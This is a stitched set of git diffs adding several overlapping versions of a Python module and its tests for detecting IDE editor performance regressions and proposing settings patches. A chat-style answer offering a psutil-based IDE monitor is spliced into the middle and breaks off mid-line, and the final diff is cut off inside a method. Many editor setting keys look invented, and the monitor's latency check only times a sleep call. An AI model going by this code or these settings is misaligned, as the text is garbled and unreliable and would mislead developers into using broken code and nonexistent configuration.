@@ -1,0 +1,2516 @@
+diff --git a/editor_performance_regression.py b/editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..4e70a06cf7e832a38ed76924feb9a563a66a044a
+--- /dev/null
++++ b/editor_performance_regression.py
+@@ -0,0 +1,178 @@
++"""Utilities to detect and mitigate editor performance regressions across IDE releases.
++
++This module focuses strictly on editor performance regressions that can break
++developer flow after a major IDE update. It compares baseline (previous
++release) telemetry against current release telemetry and recommends concrete,
++low-risk mitigations.
++"""
++
++from __future__ import annotations
++
++from dataclasses import dataclass
++from statistics import median
++from typing import Dict, Iterable, List, Mapping
++
++
++MetricSeries = Mapping[str, Iterable[float]]
++Settings = Dict[str, object]
++
++
++@dataclass(frozen=True)
++class Mitigation:
++    """A setting patch that can reduce a specific regression."""
++
++    name: str
++    reason: str
++    setting_updates: Mapping[str, object]
++
++
++@dataclass(frozen=True)
++class Regression:
++    """Represents a detected regression with a recommended mitigation."""
++
++    metric: str
++    baseline_median: float
++    current_median: float
++    increase_ratio: float
++    mitigation: Mitigation
++
++
++# Known high-impact regressions observed in major IDE releases.
++KNOWN_MITIGATIONS: Mapping[str, Mitigation] = {
++    "typing_latency_ms": Mitigation(
++        name="reduce-on-type-work",
++        reason=(
++            "Typing latency regressed. Disable expensive inline features that "
++            "run on each keystroke."
++        ),
++        setting_updates={
++            "editor.semanticHighlighting.enabled": False,
++            "editor.inlayHints.enabled": "offUnlessPressed",
++        },
++    ),
++    "completion_latency_ms": Mitigation(
++        name="defer-heavy-completion-sources",
++        reason=(
++            "Completion latency regressed. Reduce synchronous completion sources "
++            "to restore interactive completion speed."
++        ),
++        setting_updates={
++            "editor.quickSuggestionsDelay": 75,
++            "editor.suggest.localityBonus": True,
++            "editor.suggest.preview": False,
++        },
++    ),
++    "project_index_time_s": Mitigation(
++        name="scope-indexing",
++        reason=(
++            "Project indexing slowed down. Exclude generated/vendor directories "
++            "to keep index rebuilds fast."
++        ),
++        setting_updates={
++            "files.watcherExclude": {
++                "**/.git/**": True,
++                "**/node_modules/**": True,
++                "**/dist/**": True,
++                "**/.next/**": True,
++            },
++            "search.exclude": {
++                "**/node_modules": True,
++                "**/dist": True,
++            },
++        },
++    ),
++    "ui_frame_time_ms": Mitigation(
++        name="reduce-ui-overdraw",
++        reason=(
++            "Editor frame time regressed. Turn off visually expensive inline "
++            "decorations by default."
++        ),
++        setting_updates={
++            "editor.codeLens": False,
++            "editor.guides.bracketPairs": False,
++            "editor.stickyScroll.enabled": False,
++        },
++    ),
++}
++
++
++def _safe_median(values: Iterable[float]) -> float:
++    seq = [float(v) for v in values]
++    if not seq:
++        raise ValueError("metric sample list cannot be empty")
++    return median(seq)
++
++
++class EditorRegressionGuard:
++    """Detects regressions between two IDE releases and suggests mitigations."""
++
++    def __init__(self, trigger_ratio: float = 1.25) -> None:
++        if trigger_ratio <= 1.0:
++            raise ValueError("trigger_ratio must be > 1.0")
++        self.trigger_ratio = trigger_ratio
++
++    def detect(
++        self,
++        baseline_metrics: MetricSeries,
++        current_metrics: MetricSeries,
++    ) -> List[Regression]:
++        """Return regressions whose current median exceeds baseline by trigger_ratio.
++
++        Metrics should be "lower is better" timings, e.g. typing latency in ms.
++        """
++        regressions: List[Regression] = []
++
++        for metric, mitigation in KNOWN_MITIGATIONS.items():
++            if metric not in baseline_metrics or metric not in current_metrics:
++                continue
++
++            base = _safe_median(baseline_metrics[metric])
++            curr = _safe_median(current_metrics[metric])
++            if base <= 0:
++                continue
++
++            ratio = curr / base
++            if ratio >= self.trigger_ratio:
++                regressions.append(
++                    Regression(
++                        metric=metric,
++                        baseline_median=base,
++                        current_median=curr,
++                        increase_ratio=ratio,
++                        mitigation=mitigation,
++                    )
++                )
++
++        return sorted(regressions, key=lambda r: r.increase_ratio, reverse=True)
++
++    def apply_mitigations(
++        self,
++        existing_settings: Mapping[str, object],
++        regressions: Iterable[Regression],
++    ) -> Settings:
++        """Merge mitigation patches into existing settings.
++
++        Existing keys are preserved unless a mitigation needs to override the key.
++        """
++        merged: Settings = dict(existing_settings)
++
++        for regression in regressions:
++            for key, value in regression.mitigation.setting_updates.items():
++                if isinstance(value, dict) and isinstance(merged.get(key), dict):
++                    merged[key] = {**merged[key], **value}
++                else:
++                    merged[key] = value
++
++        return merged
++
++
++def recommend_editor_settings(
++    baseline_metrics: MetricSeries,
++    current_metrics: MetricSeries,
++    existing_settings: Mapping[str, object],
++    trigger_ratio: float = 1.25,
++) -> Settings:
++    """Convenience API to generate patched editor settings for regressions."""
++    guard = EditorRegressionGuard(trigger_ratio=trigger_ratio)
++    regressions = guard.detect(baseline_metrics, current_metrics)
++    return guard.apply_mitigations(existing_settings, regressions)
+diff --git a/test_editor_performance_regression.py b/test_editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..6fce24ff0bd54eea8bcd9edfdc54705b7eee8af8
+--- /dev/null
++++ b/test_editor_performance_regression.py
+@@ -0,0 +1,47 @@
++import unittest
++
++from editor_performance_regression import EditorRegressionGuard, recommend_editor_settings
++
++
++class EditorRegressionGuardTests(unittest.TestCase):
++    def test_detects_regressions_for_major_release(self):
++        baseline = {
++            "typing_latency_ms": [21, 20, 22, 19],
++            "completion_latency_ms": [48, 51, 49],
++            "project_index_time_s": [31, 30, 33],
++            "ui_frame_time_ms": [11.5, 11.0, 11.7],
++        }
++        current = {
++            "typing_latency_ms": [36, 40, 39],
++            "completion_latency_ms": [62, 63, 64],
++            "project_index_time_s": [42, 44, 43],
++            "ui_frame_time_ms": [13.2, 13.6, 13.5],
++        }
++
++        guard = EditorRegressionGuard(trigger_ratio=1.25)
++        regressions = guard.detect(baseline, current)
++
++        self.assertEqual([r.metric for r in regressions], [
++            "typing_latency_ms",
++            "project_index_time_s",
++            "completion_latency_ms",
++        ])
++
++    def test_applies_only_required_mitigations(self):
++        baseline = {"typing_latency_ms": [20, 20, 20]}
++        current = {"typing_latency_ms": [30, 30, 30]}
++        settings = {
++            "editor.fontSize": 14,
++            "files.watcherExclude": {"**/.cache/**": True},
++        }
++
++        patched = recommend_editor_settings(baseline, current, settings, trigger_ratio=1.2)
++
++        self.assertEqual(patched["editor.fontSize"], 14)
++        self.assertFalse(patched["editor.semanticHighlighting.enabled"])
++        self.assertEqual(patched["editor.inlayHints.enabled"], "offUnlessPressed")
++        self.assertEqual(patched["files.watcherExclude"], {"**/.cache/**": True})
++
++
++if __name__ == "__main__":
++    unittest.main()
+diff --git a/editor_performance_regression.py b/editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..4aeff5fe302e3738f8590d00c7b5453fb6c04257
+--- /dev/null
++++ b/editor_performance_regression.py
+@@ -0,0 +1,189 @@
++"""Tools for detecting and mitigating editor performance regressions across IDE releases.
++
++This module focuses only on developer-flow issues inside editors:
++- typing latency
++- code completion latency
++- indexing cost
++- file open/save responsiveness
++
++It can be integrated into an IDE plugin, startup hook, or CI guardrail that
++compares a new IDE release profile against a known-good baseline and applies
++safe mitigation settings when regressions are detected.
++"""
++
++from __future__ import annotations
++
++from dataclasses import dataclass
++from enum import Enum
++from statistics import fmean
++from typing import Dict, Iterable, List, Mapping
++
++
++@dataclass(frozen=True)
++class OperationMetric:
++    """Single performance measurement for an editor operation."""
++
++    operation: str
++    p95_latency_ms: float
++    cpu_percent: float
++    memory_mb: float
++
++
++@dataclass(frozen=True)
++class ReleaseProfile:
++    """Performance profile for one IDE release."""
++
++    release: str
++    metrics: List[OperationMetric]
++
++    def by_operation(self) -> Dict[str, OperationMetric]:
++        return {metric.operation: metric for metric in self.metrics}
++
++
++class RegressionSeverity(str, Enum):
++    MINOR = "minor"
++    MAJOR = "major"
++    CRITICAL = "critical"
++
++
++@dataclass(frozen=True)
++class RegressionReport:
++    operation: str
++    baseline_p95_ms: float
++    candidate_p95_ms: float
++    slowdown_ratio: float
++    severity: RegressionSeverity
++
++
++class EditorRegressionGuard:
++    """Detects regressions and returns mitigation settings to preserve flow."""
++
++    def __init__(
++        self,
++        baseline: ReleaseProfile,
++        major_threshold_ratio: float = 1.25,
++        critical_threshold_ratio: float = 1.6,
++    ) -> None:
++        if major_threshold_ratio <= 1.0:
++            raise ValueError("major_threshold_ratio must be > 1.0")
++        if critical_threshold_ratio <= major_threshold_ratio:
++            raise ValueError("critical_threshold_ratio must be > major_threshold_ratio")
++
++        self._baseline = baseline
++        self._major_threshold_ratio = major_threshold_ratio
++        self._critical_threshold_ratio = critical_threshold_ratio
++
++    def detect(self, candidate: ReleaseProfile) -> List[RegressionReport]:
++        """Return regressions found in candidate release profile."""
++        regressions: List[RegressionReport] = []
++        baseline_map = self._baseline.by_operation()
++
++        for op, current in candidate.by_operation().items():
++            baseline_metric = baseline_map.get(op)
++            if baseline_metric is None:
++                continue
++            if baseline_metric.p95_latency_ms <= 0:
++                continue
++
++            slowdown = current.p95_latency_ms / baseline_metric.p95_latency_ms
++            if slowdown < self._major_threshold_ratio:
++                continue
++
++            if slowdown >= self._critical_threshold_ratio:
++                severity = RegressionSeverity.CRITICAL
++            elif slowdown >= self._major_threshold_ratio:
++                severity = RegressionSeverity.MAJOR
++            else:
++                severity = RegressionSeverity.MINOR
++
++            regressions.append(
++                RegressionReport(
++                    operation=op,
++                    baseline_p95_ms=baseline_metric.p95_latency_ms,
++                    candidate_p95_ms=current.p95_latency_ms,
++                    slowdown_ratio=slowdown,
++                    severity=severity,
++                )
++            )
++
++        return sorted(regressions, key=lambda r: r.slowdown_ratio, reverse=True)
++
++    def flow_safe_mitigations(self, regressions: Iterable[RegressionReport]) -> Dict[str, object]:
++        """Generate mitigation settings that target real editor flow bottlenecks."""
++        regressions = list(regressions)
++        if not regressions:
++            return {
++                "editor.experimental.incrementalParsing": True,
++                "editor.indexing.strategy": "balanced",
++            }
++
++        operations = {r.operation for r in regressions}
++        worst_ratio = max(r.slowdown_ratio for r in regressions)
++
++        settings: Dict[str, object] = {
++            # Default to safer parsing/indexing strategy after regressions
++            "editor.experimental.incrementalParsing": True,
++            "editor.indexing.strategy": "incremental",
++            "editor.diagnostics.scope": "visibleEditors",
++        }
++
++        if "typing" in operations:
++            settings.update(
++                {
++                    "editor.diagnostics.onType": False,
++                    "editor.semanticTokens.debounceMs": 75,
++                    "editor.codeActions.onType": False,
++                }
++            )
++
++        if "completion" in operations:
++            settings.update(
++                {
++                    "editor.completion.maxVisibleSuggestions": 40,
++                    "editor.completion.snippetPriority": "inline",
++                    "editor.completion.resolveDocumentation": "lazy",
++                }
++            )
++
++        if "indexing" in operations:
++            settings.update(
++                {
++                    "editor.indexing.maxThreads": 2,
++                    "editor.indexing.excludeGlobs": ["**/dist/**", "**/.next/**", "**/node_modules/**"],
++                    "editor.files.watcherPolling": "smart",
++                }
++            )
++
++        if worst_ratio >= self._critical_threshold_ratio:
++            settings.update(
++                {
++                    "editor.performanceMode": "strict",
++                    "editor.extensions.deferActivation": True,
++                    "editor.startup.prewarmSymbolCache": True,
++                }
++            )
++
++        return settings
++
++    @staticmethod
++    def aggregate_latency(profile: ReleaseProfile, operations: Iterable[str]) -> float:
++        """Average p95 latency for selected operations in a release."""
++        wanted = set(operations)
++        values = [metric.p95_latency_ms for metric in profile.metrics if metric.operation in wanted]
++        if not values:
++            return 0.0
++        return fmean(values)
++
++
++def build_profile(release: str, raw_metrics: Mapping[str, Mapping[str, float]]) -> ReleaseProfile:
++    """Convenience builder from plain dictionaries."""
++    metrics = [
++        OperationMetric(
++            operation=op,
++            p95_latency_ms=values["p95_latency_ms"],
++            cpu_percent=values.get("cpu_percent", 0.0),
++            memory_mb=values.get("memory_mb", 0.0),
++        )
++        for op, values in raw_metrics.items()
++    ]
++    return ReleaseProfile(release=release, metrics=metrics)
+diff --git a/tests/test_editor_performance_regression.py b/tests/test_editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..dbf37fed7f954e90e401261855303d081f4ee37b
+--- /dev/null
++++ b/tests/test_editor_performance_regression.py
+@@ -0,0 +1,76 @@
++import unittest
++
++from editor_performance_regression import (
++    EditorRegressionGuard,
++    RegressionSeverity,
++    build_profile,
++)
++
++
++class EditorRegressionGuardTests(unittest.TestCase):
++    def setUp(self):
++        self.baseline = build_profile(
++            "2024.1",
++            {
++                "typing": {"p95_latency_ms": 22, "cpu_percent": 34, "memory_mb": 420},
++                "completion": {"p95_latency_ms": 48, "cpu_percent": 41, "memory_mb": 500},
++                "indexing": {"p95_latency_ms": 140, "cpu_percent": 80, "memory_mb": 920},
++            },
++        )
++
++    def test_detects_major_and_critical_regressions(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 30, "cpu_percent": 55, "memory_mb": 490},
++                "completion": {"p95_latency_ms": 82, "cpu_percent": 63, "memory_mb": 560},
++                "indexing": {"p95_latency_ms": 182, "cpu_percent": 89, "memory_mb": 1100},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++
++        self.assertEqual([r.operation for r in regressions], ["completion", "typing", "indexing"])
++        severities = {r.operation: r.severity for r in regressions}
++        self.assertEqual(severities["typing"], RegressionSeverity.MAJOR)
++        self.assertEqual(severities["completion"], RegressionSeverity.CRITICAL)
++
++    def test_mitigations_target_detected_operations(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 42},
++                "completion": {"p95_latency_ms": 50},
++                "indexing": {"p95_latency_ms": 230},
++            },
++        )
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++        settings = guard.flow_safe_mitigations(regressions)
++
++        self.assertTrue(settings["editor.experimental.incrementalParsing"])
++        self.assertFalse(settings["editor.diagnostics.onType"])
++        self.assertEqual(settings["editor.indexing.maxThreads"], 2)
++        self.assertEqual(settings["editor.performanceMode"], "strict")
++
++    def test_no_regressions_returns_balanced_defaults(self):
++        candidate = build_profile(
++            "2024.2",
++            {
++                "typing": {"p95_latency_ms": 24},
++                "completion": {"p95_latency_ms": 50},
++                "indexing": {"p95_latency_ms": 143},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++        settings = guard.flow_safe_mitigations(regressions)
++
++        self.assertEqual(regressions, [])
++        self.assertEqual(settings["editor.indexing.strategy"], "balanced")
++
++
++if __name__ == "__main__":
++    unittest.main()
+Here's a Python script that monitors and mitigates common IDE performance regressions by analyzing editor latency, memory usage, and file indexing behavior:
+
+```py
+# Required installations
+# pip install psutil pywin32 (Windows) / pip install psutil (Linux/Mac)
+# pip install watchdog
+# pip install matplotlib
+
+import psutil
+import time
+import os
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+import matplotlib.pyplot as plt
+from datetime import datetime
+
+class IDEHealthMonitor:
+    def __init__(self):
+        self.start_time = time.time()
+        self.latency_records = []
+        self.memory_records = []
+        self.file_events = 0
+        self.last_event_time = 0
+    
+    def measure_editor_latency(self):
+        """Simulate editor response time measurement"""
+        start = time.time()
+        # Simulate typing latency measurement
+        time.sleep(0.001)  # Small delay for realistic measurement
+        latency = (time.time() - start) * 1000  # Convert to milliseconds
+        self.latency_records.append((time.time(), latency))
+        return latency
+    
+    def check_memory_usage(self):
+        """Monitor IDE memory consumption"""
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
+            if 'java' in proc.info['name'].lower() or 'pycharm' in proc.info['name'].lower():
+                mem = proc.info['memory_info'].rss / (1024 * 1024)  # MB
+                self.memory_records.append((time.time(), mem))
+                return mem
+        return 0
+    
+    def detect_file_indexing(self, path):
+        """Track file system events that might indicate indexing"""
+        self.file_events += 1
+        self.last_event_time = time.time()
+    
+    def analyze_performance(self):
+        """Analyze collected metrics and suggest optimizations"""
+        if len(self.latency_records) < 2:
+            return "Insufficient data"
+        
+        # Calculate average latency
+        avg_latency = sum(lat for _, lat in self.latency_records) / len(self.latency_records)
+        
+        # Check for memory leaks
+        mem_growth = (self.memory_records[-1][1] - self.memory_records[0][1]) if len(self.memory_records) > 1 else 0
+        
+        # Check indexing frequency
+        indexing_intensity = self.file_events / (time.time() - self.start_time)
+        
+        recommendations = []
+        if avg_latency > 50:
+            recommendations.append(f"- Disable plugins (current typing latency: {avg_latency:.2f}ms)")
+        if mem_growth > 200:
+            recommendations.append(f"- Restart IDE (memory growth: {mem_growth:.2f}MB)")
+        if indexing_intensity > 0.5:
+            recommendations.append(f"- Exclude directories from indexing (events/sec: {indexing_intensity:.2f})")
+        
+        return "\n".join(recommendations) if recommendations else "Performance appears normal"
+
+class FileIndexingHandler(FileSystemEventHandler):
+    def __init__(self, monitor):
+        self.monitor = monitor
+    
+    def on_modified(self, event):
+        if not event.is_directory:
+            self.monitor.detect_file_indexing(event.src_path)
+
+def main():
+    monitor = IDEHealthMonitor()
+    
+    # Setup file watcher
+    event_handler = FileIndexingHandler(monitor)
+    observer = Observer()
+    observer.schedule(event_handler, path='
+    diff --git a/editor_performance_regression.py b/editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..fd686dc09465874d382baac827cb9d4cca99e2a7
+--- /dev/null
++++ b/editor_performance_regression.py
+@@ -0,0 +1,260 @@
++"""Incident-first tools to recover editor performance and reliability regressions.
++
++Focus: regressions that break developer flow across IDE/editor releases.
++Scope: typing, completion, indexing, file open/save, and their impact on
++release reliability (blocked CI pipelines, delayed releases).
++"""
++
++from __future__ import annotations
++
++from dataclasses import dataclass
++from enum import Enum
++from statistics import fmean
++from typing import Dict, Iterable, List, Mapping, Sequence
++
++
++@dataclass(frozen=True)
++class OperationMetric:
++    operation: str
++    p95_latency_ms: float
++    cpu_percent: float
++    memory_mb: float
++
++
++@dataclass(frozen=True)
++class ReleaseProfile:
++    release: str
++    metrics: List[OperationMetric]
++
++    def by_operation(self) -> Dict[str, OperationMetric]:
++        return {metric.operation: metric for metric in self.metrics}
++
++
++class RegressionSeverity(str, Enum):
++    MAJOR = "major"
++    CRITICAL = "critical"
++
++
++@dataclass(frozen=True)
++class RegressionReport:
++    operation: str
++    baseline_p95_ms: float
++    candidate_p95_ms: float
++    slowdown_ratio: float
++    severity: RegressionSeverity
++
++
++@dataclass(frozen=True)
++class EditorIncident:
++    """Active production incident tied to editor performance/reliability."""
++
++    incident_id: str
++    editor: str
++    language: str
++    platform: str
++    operation: str
++    pipeline_blocked: bool
++    release_delayed: bool
++
++
++@dataclass(frozen=True)
++class RemediationAction:
++    title: str
++    rationale: str
++    owner: str
++
++
++@dataclass(frozen=True)
++class IncidentRestorationPlan:
++    """Concrete actions to restore developer flow and release reliability today."""
++
++    actions: List[RemediationAction]
++    mitigation_settings: Dict[str, object]
++    restored_ephemeral_releases: List[str]
++
++
++class EditorRegressionGuard:
++    """Detects regressions and generates operational restoration plans."""
++
++    def __init__(
++        self,
++        baseline: ReleaseProfile,
++        major_threshold_ratio: float = 1.25,
++        critical_threshold_ratio: float = 1.6,
++    ) -> None:
++        if major_threshold_ratio <= 1.0:
++            raise ValueError("major_threshold_ratio must be > 1.0")
++        if critical_threshold_ratio <= major_threshold_ratio:
++            raise ValueError("critical_threshold_ratio must be > major_threshold_ratio")
++
++        self._baseline = baseline
++        self._major_threshold_ratio = major_threshold_ratio
++        self._critical_threshold_ratio = critical_threshold_ratio
++
++    def detect(self, candidate: ReleaseProfile) -> List[RegressionReport]:
++        regressions: List[RegressionReport] = []
++        baseline_map = self._baseline.by_operation()
++
++        for op, current in candidate.by_operation().items():
++            baseline_metric = baseline_map.get(op)
++            if baseline_metric is None or baseline_metric.p95_latency_ms <= 0:
++                continue
++
++            slowdown = current.p95_latency_ms / baseline_metric.p95_latency_ms
++            if slowdown < self._major_threshold_ratio:
++                continue
++
++            severity = (
++                RegressionSeverity.CRITICAL
++                if slowdown >= self._critical_threshold_ratio
++                else RegressionSeverity.MAJOR
++            )
++            regressions.append(
++                RegressionReport(
++                    operation=op,
++                    baseline_p95_ms=baseline_metric.p95_latency_ms,
++                    candidate_p95_ms=current.p95_latency_ms,
++                    slowdown_ratio=slowdown,
++                    severity=severity,
++                )
++            )
++
++        return sorted(regressions, key=lambda r: r.slowdown_ratio, reverse=True)
++
++    def flow_safe_mitigations(self, regressions: Iterable[RegressionReport]) -> Dict[str, object]:
++        regressions = list(regressions)
++        if not regressions:
++            return {
++                "editor.experimental.incrementalParsing": True,
++                "editor.indexing.strategy": "balanced",
++            }
++
++        operations = {r.operation for r in regressions}
++        worst_ratio = max(r.slowdown_ratio for r in regressions)
++        settings: Dict[str, object] = {
++            "editor.experimental.incrementalParsing": True,
++            "editor.indexing.strategy": "incremental",
++            "editor.diagnostics.scope": "visibleEditors",
++            "editor.reliability.safeMode": True,
++        }
++
++        if "typing" in operations:
++            settings.update(
++                {
++                    "editor.diagnostics.onType": False,
++                    "editor.semanticTokens.debounceMs": 75,
++                    "editor.codeActions.onType": False,
++                }
++            )
++
++        if "completion" in operations:
++            settings.update(
++                {
++                    "editor.completion.maxVisibleSuggestions": 40,
++                    "editor.completion.resolveDocumentation": "lazy",
++                    "editor.completion.ai.ranker": "defer",
++                }
++            )
++
++        if "indexing" in operations:
++            settings.update(
++                {
++                    "editor.indexing.maxThreads": 2,
++                    "editor.indexing.excludeGlobs": ["**/dist/**", "**/.next/**", "**/node_modules/**"],
++                    "editor.files.watcherPolling": "smart",
++                }
++            )
++
++        if "file_open" in operations or "file_save" in operations:
++            settings.update(
++                {
++                    "editor.fsync.batchWrites": True,
++                    "editor.fileWatcher.backpressure": "adaptive",
++                }
++            )
++
++        if worst_ratio >= self._critical_threshold_ratio:
++            settings.update(
++                {
++                    "editor.performanceMode": "strict",
++                    "editor.extensions.deferActivation": True,
++                    "editor.startup.prewarmSymbolCache": True,
++                }
++            )
++
++        return settings
++
++    def restore_today(
++        self,
++        candidate: ReleaseProfile,
++        incidents: Sequence[EditorIncident],
++    ) -> IncidentRestorationPlan:
++        """Build an incident response plan for editors/languages/platforms today."""
++        regressions = self.detect(candidate)
++        settings = self.flow_safe_mitigations(regressions)
++        actions: List[RemediationAction] = []
++        restored: List[str] = []
++
++        for incident in incidents:
++            if incident.pipeline_blocked:
++                actions.append(
++                    RemediationAction(
++                        title=(
++                            f"Unblock pipeline for {incident.editor}/{incident.language}/{incident.platform}"
++                        ),
++                        rationale=(
++                            "Apply safe-mode editor settings and rerun affected lint/test jobs "
++                            "with warmed index caches to remove release-stopping latency spikes."
++                        ),
++                        owner="dev-experience-oncall",
++                    )
++                )
++
++            if incident.release_delayed:
++                release_ref = f"{incident.editor}:{incident.language}:{incident.platform}"
++                restored.append(release_ref)
++                actions.append(
++                    RemediationAction(
++                        title=f"Restore delayed release to ephemeral channel ({release_ref})",
++                        rationale=(
++                            "Roll back editor plugin/runtime toggles to last green profile, "
++                            "ship as ephemeral preview, and keep production channel protected "
++                            "until p95 typing/completion/indexing stabilizes."
++                        ),
++                        owner="release-manager",
++                    )
++                )
++
++        if not actions:
++            actions.append(
++                RemediationAction(
++                    title="No active delivery incidents",
++                    rationale="Continue observing editor telemetry and keep balanced settings.",
++                    owner="dev-experience-observability",
++                )
++            )
++
++        return IncidentRestorationPlan(
++            actions=actions,
++            mitigation_settings=settings,
++            restored_ephemeral_releases=sorted(set(restored)),
++        )
++
++    @staticmethod
++    def aggregate_latency(profile: ReleaseProfile, operations: Iterable[str]) -> float:
++        wanted = set(operations)
++        values = [metric.p95_latency_ms for metric in profile.metrics if metric.operation in wanted]
++        return fmean(values) if values else 0.0
++
++
++def build_profile(release: str, raw_metrics: Mapping[str, Mapping[str, float]]) -> ReleaseProfile:
++    metrics = [
++        OperationMetric(
++            operation=op,
++            p95_latency_ms=values["p95_latency_ms"],
++            cpu_percent=values.get("cpu_percent", 0.0),
++            memory_mb=values.get("memory_mb", 0.0),
++        )
++        for op, values in raw_metrics.items()
++    ]
++    return ReleaseProfile(release=release, metrics=metrics)
+diff --git a/tests/test_editor_performance_regression.py b/tests/test_editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..6b294232c2be4f8e6842815bba57fcb2b2a8da3b
+--- /dev/null
++++ b/tests/test_editor_performance_regression.py
+@@ -0,0 +1,109 @@
++import unittest
++
++from editor_performance_regression import (
++    EditorIncident,
++    EditorRegressionGuard,
++    RegressionSeverity,
++    build_profile,
++)
++
++
++class EditorRegressionGuardTests(unittest.TestCase):
++    def setUp(self):
++        self.baseline = build_profile(
++            "2024.1",
++            {
++                "typing": {"p95_latency_ms": 22, "cpu_percent": 34, "memory_mb": 420},
++                "completion": {"p95_latency_ms": 48, "cpu_percent": 41, "memory_mb": 500},
++                "indexing": {"p95_latency_ms": 140, "cpu_percent": 80, "memory_mb": 920},
++                "file_open": {"p95_latency_ms": 30, "cpu_percent": 20, "memory_mb": 350},
++            },
++        )
++
++    def test_detects_major_and_critical_regressions(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 30, "cpu_percent": 55, "memory_mb": 490},
++                "completion": {"p95_latency_ms": 82, "cpu_percent": 63, "memory_mb": 560},
++                "indexing": {"p95_latency_ms": 182, "cpu_percent": 89, "memory_mb": 1100},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++
++        self.assertEqual([r.operation for r in regressions], ["completion", "typing", "indexing"])
++        severities = {r.operation: r.severity for r in regressions}
++        self.assertEqual(severities["typing"], RegressionSeverity.MAJOR)
++        self.assertEqual(severities["completion"], RegressionSeverity.CRITICAL)
++
++    def test_mitigations_target_detected_operations(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 42},
++                "completion": {"p95_latency_ms": 50},
++                "indexing": {"p95_latency_ms": 230},
++                "file_open": {"p95_latency_ms": 55},
++            },
++        )
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++        settings = guard.flow_safe_mitigations(regressions)
++
++        self.assertTrue(settings["editor.experimental.incrementalParsing"])
++        self.assertFalse(settings["editor.diagnostics.onType"])
++        self.assertEqual(settings["editor.indexing.maxThreads"], 2)
++        self.assertEqual(settings["editor.performanceMode"], "strict")
++        self.assertTrue(settings["editor.fsync.batchWrites"])
++
++    def test_restore_today_clears_pipeline_and_restores_ephemeral_release(self):
++        candidate = build_profile(
++            "2025.1",
++            {
++                "typing": {"p95_latency_ms": 45},
++                "completion": {"p95_latency_ms": 90},
++                "indexing": {"p95_latency_ms": 230},
++            },
++        )
++        incidents = [
++            EditorIncident(
++                incident_id="INC-101",
++                editor="vscode",
++                language="python",
++                platform="linux",
++                operation="typing",
++                pipeline_blocked=True,
++                release_delayed=True,
++            )
++        ]
++
++        guard = EditorRegressionGuard(self.baseline)
++        plan = guard.restore_today(candidate, incidents)
++
++        self.assertEqual(len(plan.actions), 2)
++        self.assertIn("vscode:python:linux", plan.restored_ephemeral_releases)
++        self.assertEqual(plan.mitigation_settings["editor.performanceMode"], "strict")
++
++    def test_no_regressions_returns_balanced_defaults(self):
++        candidate = build_profile(
++            "2024.2",
++            {
++                "typing": {"p95_latency_ms": 24},
++                "completion": {"p95_latency_ms": 50},
++                "indexing": {"p95_latency_ms": 143},
++                "file_open": {"p95_latency_ms": 31},
++            },
++        )
++
++        guard = EditorRegressionGuard(self.baseline)
++        regressions = guard.detect(candidate)
++        settings = guard.flow_safe_mitigations(regressions)
++
++        self.assertEqual(regressions, [])
++        self.assertEqual(settings["editor.indexing.strategy"], "balanced")
++
++
++if __name__ == "__main__":
++    unittest.main()
+diff --git a/editor_performance_regression.py b/editor_performance_regression.py
+new file mode 100644
+index 0000000000000000000000000000000000000000..c83b78167b1f5a5745b699218432c442e1c37824
+--- /dev/null
++++ b/editor_performance_regression.py
+@@ -0,0 +1,271 @@
++"""Editor performance regression detection and incident restoration tooling.
++
++Focus area:
++- editor responsiveness regressions across IDE releases
++- reliability incidents that break developer flow (stuck pipelines, release delays)
++- fast, reversible mitigations for editors/languages/platforms
++"""
++
++from __future__ import annotations
++
++from dataclasses import dataclass
++from enum import Enum
++from statistics import fmean
++from typing import Dict, Iterable, List, Mapping, Sequence
++
++
++@dataclass(frozen=True)
++class OperationMetric:
++    """Single performance measurement for an editor operation."""
++
++    operation: str
++    p95_latency_ms: float
++    cpu_percent: float
++    memory_mb: float
++
++
++@dataclass(frozen=True)
++class ReleaseProfile:
++    """Performance profile for one IDE release."""
++
++    release: str
++    metrics: List[OperationMetric]
++
++    def by_operation(self) -> Dict[str, OperationMetric]:
++        return {metric.operation: metric for metric in self.metrics}
++
++
++class RegressionSeverity(str, Enum):
++    MINOR = "minor"
++    MAJOR = "major"
++    CRITICAL = "critical"
++
++
++@dataclass(frozen=True)
++class RegressionReport:
++    operation: str
++    baseline_p95_ms: float
++    candidate_p95_ms: float
++    slowdown_ratio: float
++    severity: RegressionSeverity
++
++
++class EditorRegressionGuard:
++    """Detects regressions and returns mitigation settings to preserve flow."""
++
++    def __init__(
++        self,
++        baseline: ReleaseProfile,
++        major_threshold_ratio: float = 1.25,
++        critical_threshold_ratio: float = 1.6,
++    ) -> None:
++        if major_threshold_ratio <= 1.0:
++            raise ValueError("major_threshold_ratio must be > 1.0")
++        if critical_threshold_ratio <= major_threshold_ratio:
++            raise ValueError("critical_threshold_ratio must be > major_threshold_ratio")
++
++        self._baseline = baseline
++        self._major_threshold_ratio = major_threshold_ratio
++        self._critical_threshold_ratio = critical_threshold_ratio
++
++    def detect(self, candidate: ReleaseProfile) -> List[RegressionReport]:
++        regressions: List[RegressionReport] = []
++        baseline_map = self._baseline.by_operation()
++
++        for op, current in candidate.by_operation().items():
++            baseline_metric = baseline_map.get(op)
++            if baseline_metric is None or baseline_metric.p95_latency_ms <= 0:
++                continue
++
++            slowdown = current.p95_latency_ms / baseline_metric.p95_latency_ms
